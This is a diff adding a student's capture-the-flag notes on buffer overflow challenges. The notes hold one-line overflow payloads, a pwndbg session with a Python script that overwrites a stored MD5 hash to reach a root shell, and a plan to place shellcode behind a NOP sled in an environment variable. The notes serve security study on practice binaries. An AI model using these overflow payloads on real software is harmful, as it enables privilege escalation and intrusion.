@@ -625,3 +625,99 @@ honestly idk just check class vid and script
 
 - went back to being same as .16
 - idek
+
+### .32 - end of the rainbow
+
+- file access check done for program name, not argument
+- executes the selected program with given argument
+- buffer is copied to argument from argv only after the access check
+- buffer overflow
+- overflow the argument's buffer ('buffer') to overwrite the program name's buffer ('filename')
+- `/challenge/run echo $(python3 -c 'print("a"*288+"/home/hacker/lint")')`
+
+### .33 - one character at a time
+
+- same, apparently some validation for program name length was added
+- but we were already using the argument buffer
+
+### .34 - going with the flow
+
+- source given
+- buffer overflow again
+- overflow the input buffer to overwrite the variable that contains the target hash to contain the hash of our input
+
+```shell
+pwndbg> b 56
+Breakpoint 1 at 0x40137d: file main.c, line 57.
+
+pwndbg> r blah
+Starting program: /challenge/run blah
+...
+In file: /challenge/main.c
+   52     }
+   53     unsigned char* digest = md5sum(data_buffer);
+   54     strcpy(checksum_0, digest);
+   55     free(digest);
+   56
+ ► 57     if (!strcmp(checksum_0, checksum_1))
+   58     {
+   59         puts("Awesome job!");
+   60         system("/bin/sh");
+   61     }
+   62     else
+
+pwndbg> p &data_buffer
+$1 = (char (*)[65]) 0x403540 <data_buffer>
+
+pwndbg> p &checksum_1
+$2 = (char (*)[33]) 0x4035a0 <checksum_1>
+```
+
+- gap b/w input data_buffer and checksum_1 is 0x60 - 96 bytes
+- fill input buffer, pad the remaining bytes, then place the hash of the 64 bytes
+
+```python
+from Crypto.Hash.MD5 import MD5Hash
+
+diff = 96
+input_str = "F" * 64
+padding = "U" * (diff - 64)
+input_str_hash = MD5Hash(input_str.encode()).hexdigest()
+payload = input_str + padding + input_str_hash
+```
+
+- boom
+
+### .35 - got hash?
+
+- buffer overflow
+- overflow input buffer to set hash
+- find a string whose hash starts with a null byte
+
+### .36 - tick tock you don't stop
+
+- simulates a TOCTOU?
+- but attack is nothing: challenge just reads lines from a file and executes them as commands
+- so just put `cat /flag` in a file and pass it
+
+### .37 - the password is
+
+- simple buffer overflow
+- strncmp, but buffer locations are next to each other
+- password in source itself
+- `/challenge/run $(python3 -c 'print("F"*512,"aQWavHydcXmOzMDAF6b4")')`
+
+### .38 - hit me baby one more time
+
+- same as .36
+- but this time, memcmp instead of strcmp
+- but the string gets null terminated forcefully
+- so use the same hash, but replace the starting null byte `\x00` of the hash with anything else
+
+### .39 - flow direct
+
+- shellcode injection, rsp is given by program
+- but buffer isn't big enough
+- where else can we put it?
+- one solution is to place shellcode in an env variable and preface it with a sufficiently large NOP sled
+- then overwrite saved rip with this shellcode's location, or at least its proximity so that it gets caught in the NOP sled
